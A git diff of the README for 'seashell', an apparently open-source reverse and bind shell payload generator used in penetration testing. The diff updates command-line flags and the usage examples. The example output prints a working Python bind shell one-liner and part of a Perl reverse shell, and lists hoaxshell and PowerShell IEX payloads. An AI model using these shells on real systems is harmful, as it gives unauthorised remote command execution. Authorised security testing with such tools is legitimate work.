@@ -13,10 +13,13 @@ $ git clone https://github.com/lil-skelly/seashell
 $ cd seashell && python3 -m pip install .
 ```
 
+- Added substitute_payload to configure payload, repaced -S with -T (type) and added custom shell support (-S).
+- Updated README.md 
 # Usage
 ```bash
 usage: python3 -m seashell [-h] [--verbose] [-os {windows,mac,linux}] [-ip IP] [-p PORT]
-                           [-shell {reverse,bind,msfvenom,hoaxshell,listeners}]
+                           [--type {reverse,bind,msfvenom,hoaxshell,listeners}]
+                           [--shell {sh,/bin/sh,bash,/bin/bash,cmd,powershell,pwsh,ash,bsh,csh,ksh,zsh,pdksh,tcsh,mksh,dash}]
                            [-P PAYLOAD] [--interactive]
                            [term]
 
@@ -32,13 +35,14 @@ options:
                         Filters results for [given] operating system
   -ip IP                Target IP
   -p PORT, --port PORT  Target port
-  -shell {reverse,bind,msfvenom,hoaxshell,listeners}, -S {reverse,bind,msfvenom,hoaxshell,listeners}
-                        Filters results for [given] shell type
+  --type {reverse,bind,msfvenom,hoaxshell,listeners}, -T {reverse,bind,msfvenom,hoaxshell,listeners}
+                        Filters results for [given] payload type
+  --shell {sh,/bin/sh,bash,/bin/bash,cmd,powershell,pwsh,ash,bsh,csh,ksh,zsh,pdksh,tcsh,mksh,dash}, -S {sh,/bin/sh,bash,/bin/bash,cmd,powershell,pwsh,ash,bsh,csh,ksh,zsh,pdksh,tcsh,mksh,dash}
+                        Shell to use
   -P PAYLOAD, --payload PAYLOAD
                         metasploit payload to use for listener [msfconsole]
   --interactive, -i     Enables interactive mode. Any arguments besides -V will be ignored!
 ```
-## Examples:
 
 Seashell filters your results based on the shell type and OS specified. 
 
@@ -52,14 +56,23 @@ After finding the ID of the payload you desire to use, you can:
 
 Seashell will then select the appropriate payload.
 
+- Now you can also list listeners to host your payload. Same way as you would list reverse shell payloads etc.
+
+
+### Special arguments
+- You can specify a *shell* to use (i.e `/bin/bash` or `zsh`) with the `-S/--shell <SHELL>` command line argument.
+- You can specify a metasploit payload to use in certain payloads with the `-P <PAYLOAD>` argument.
+
+## Examples:
+
 - Example 1 (manual mode)
 ```bash
-$ python -m seashell -ip localhost -p 1234 -shell bind python
+$ python -m seashell -ip localhost -p 1234 -T bind python
 [+] Welcome to the sea of shells! Happy pwning >:)
 [*] Python3 Bind         70
 [*] PHP Bind             71
 
-$ python -m seashell -ip localhost -p 1234 -shell bind 70
+$ python -m seashell -ip localhost -p 1234 -T bind 70
 [*] Welcome to the sea of shells! Happy pwning >:)
 [+] Using <Python3 Bind>
 python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();
@@ -85,7 +98,7 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:44
 
 - Example 3 (payload listing in manual mode)
 ```bash
-$ python -m seashell -ip localhost -os windows -shell hoaxshell list
+$ python -m seashell -ip localhost -os windows -T hoaxshell list
 [+] Welcome to the sea of shells! Happy pwning >:)
 [*] Windows CMD cURL     94
 [*] PowerShell IEX       95
